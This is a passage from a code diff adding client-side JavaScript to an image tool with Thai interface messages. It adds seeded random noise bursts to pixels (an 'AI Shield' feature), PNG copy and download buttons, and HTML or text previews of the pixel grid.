+    const burstCount=Math.floor(strength/2);
+    let rng=seed;
+    const next=()=>{ rng=(rng*16807)%2147483647; return (rng-1)/2147483646; };
+    for(let i=0;i<s.length;i++) d[i]=s[i];
+    for(let b=0;b<burstCount;b++){
+        const x=Math.floor(next()*w);
+        const y=Math.floor(next()*h);
+        const len=Math.floor(next()*20+5);
+        const dir=next()>0.5?1:0;
+        for(let k=0;k<len;k++){
+            const px=dir?Math.min(w-1,x+k):x;
+            const py=dir?y:Math.min(h-1,y+k);
+            const i=(py*w+px)*4;
+            if(next()>0.5) d[i]=Math.floor(next()*255);
+            if(next()>0.5) d[i+1]=Math.floor(next()*255);
+            if(next()>0.5) d[i+2]=Math.floor(next()*255);
+        }
+    }
+}
+
+// ==================== COPY / DOWNLOAD SHIELD ====================
+function copyShieldImage(){
+    if(!shieldData){ showToast('กรุณาประมวลผล AI Shield ก่อน'); return; }
+    try{
+        canvas.toBlob(async(blob)=>{
+            if(!blob)return;
+            try{ await navigator.clipboard.write([new ClipboardItem({'image/png':blob})]); showToast('คัดลอกภาพ Shield แล้ว!'); }
+            catch(err){
+                const url=URL.createObjectURL(blob); const a=document.createElement('a'); a.href=url; a.download=`ai-shield-${frameW}x${frameH}.png`; a.click(); URL.revokeObjectURL(url);
+                showToast('ดาวน์โหลดภาพ Shield แล้ว');
+            }
+        });
+    }catch(e){ showToast('ไม่สามารถคัดลอกได้'); }
+}
+
+function downloadShield(){
+    if(!shieldData){ showToast('กรุณาประมวลผล AI Shield ก่อน'); return; }
+    const url=canvas.toDataURL('image/png');
+    const a=document.createElement('a'); a.href=url; a.download=`ai-shield-${Date.now()}.png`; a.click();
+    showToast('ดาวน์โหลดสำเร็จ!');
+}
+
+// ==================== ORIGINAL COPY ====================
+document.getElementById('copyImageBtn').addEventListener('click',async()=>{
+    try{
+        canvas.toBlob(async(blob)=>{
+            if(!blob)return;
+            try{ await navigator.clipboard.write([new ClipboardItem({'image/png':blob})]); showToast('คัดลอกภาพ PNG แล้ว!'); }
+            catch(err){
+                const url=URL.createObjectURL(blob); const a=document.createElement('a'); a.href=url; a.download=`pixel-rgb-${frameW}x${frameH}.png`; a.click(); URL.revokeObjectURL(url);
+                showToast('ดาวน์โหลดภาพแล้ว');
+            }
+        });
+    }catch(e){ showToast('ไม่สามารถคัดลอกได้'); }
+});
+
+document.getElementById('copyTextBtn').addEventListener('click',()=>{ openModal(); generatePreview(); });
+function openModal(){ document.getElementById('copyModal').classList.add('active'); }
+function closeModal(){ document.getElementById('copyModal').classList.remove('active'); }
+function switchTab(tab){ currentTab=tab; document.querySelectorAll('.copy-tab').forEach(t=>t.classList.remove('active')); event.target.classList.add('active'); generatePreview(); }
+
+function generatePreview(){
+    if(!sourceData){ document.getElementById('previewArea').textContent='กรุณาอัปโหลดภาพก่อน'; return; }
+    const d=sourceData.data; const area=document.getElementById('previewArea'); area.innerHTML='';
+    if(currentTab==='ansi'){
+        let html='';
+        for(let y=0;y<frameH;y++){ for(let x=0;x<frameW;x++){ const idx=(y*frameW+x)*4; html+=`<span style="color:rgb(${d[idx]},${d[idx+1]},${d[idx+2]})">&#9608;</span>`; } html+='<br>'; }
+        area.innerHTML=html; area.dataset.raw=html; area.dataset.type='text/html';
+    }else if(currentTab==='html'){
+        let html=`<div style="display:inline-grid;grid-template-columns:repeat(${frameW},8px);grid-template-rows:repeat(${frameH},8px);gap:0;line-height:0;font-size:0;">`;
+        for(let y=0;y<frameH;y++){ for(let x=0;x<frameW;x++){ const idx=(y*frameW+x)*4; html+=`<div style="width:8px;height:8px;display:grid;grid-template-columns:1fr 1fr 1fr;overflow:hidden"><div style="background:rgb(${d[idx]},0,0)"></div><div style="background:rgb(0,${d[idx+1]},0)"></div><div style="background:rgb(0,0,${d[idx+2]})"></div></div>`; } }
+        html+='</div>'; area.innerHTML=html; area.dataset.raw=html; area.dataset.type='text/html';
+    }else if(currentTab==='subpixel'){
+        let html='';
+        for(let y=0;y<frameH;y++){ for(let x=0;x<frameW;x++){ const idx=(y*frameW+x)*4; html+=`<span style="color:rgb(${d[idx]},0,0)">&#9608;</span><span style="color:rgb(0,${d[idx+1]},0)">&#9608;</span><span style="color:rgb(0,0,${d[idx+2]})">&#9608;</span>`; } html+='<br>'; }
+        area.innerHTML=html; area.dataset.raw=area.innerText; area.dataset.type='text/plain';
+    }
+}
+function copyCurrentTab(){
+    const area=document.getElementById('previewArea'); const raw=area.dataset.raw||''; const type=area.dataset.type||'text/plain';
+    if(!raw){ showToast('ไม่มีข้อมูล'); return; }
+    if(type==='text/html'){ const blob=new Blob([raw],{type:'text/html'}); navigator.clipboard.write([new ClipboardItem({'text/html':blob})]).then(()=>showToast('คัดลอก HTML แล้ว')).catch(()=>navigator.clipboard.writeText(raw).then(()=>showToast('คัดลอก HTML Code'))); }
+    else { navigator.clipboard.writeText(raw).then(()=>showToast('คัดลอก Text แล้ว')).catch(()=>showToast('ไม่สามารถคัดลอกได้')); }
+}
+
+// ==================== UTILS ====================
+function showToast(msg){ toast.textContent=msg; toast.classList.add('show'); setTimeout(()=>toast.classList.remove('show'),2500); }
+function showLoading(show){ document.getElementById('loadingOverlay').classList.toggle('active',show); }
+document.getElementById('copyModal').addEventListener('click',(e)=>{ if(e.target===e.currentTarget)closeModal(); });
+document.addEventListener('keydown',(e)=>{ if(e.key==='Escape'){ closeModal(); document.getElementById('warningModal').classList.remove('active'); } });
+
+// ==================== START ====================
+init();
+</script>
 </body>
 </html>
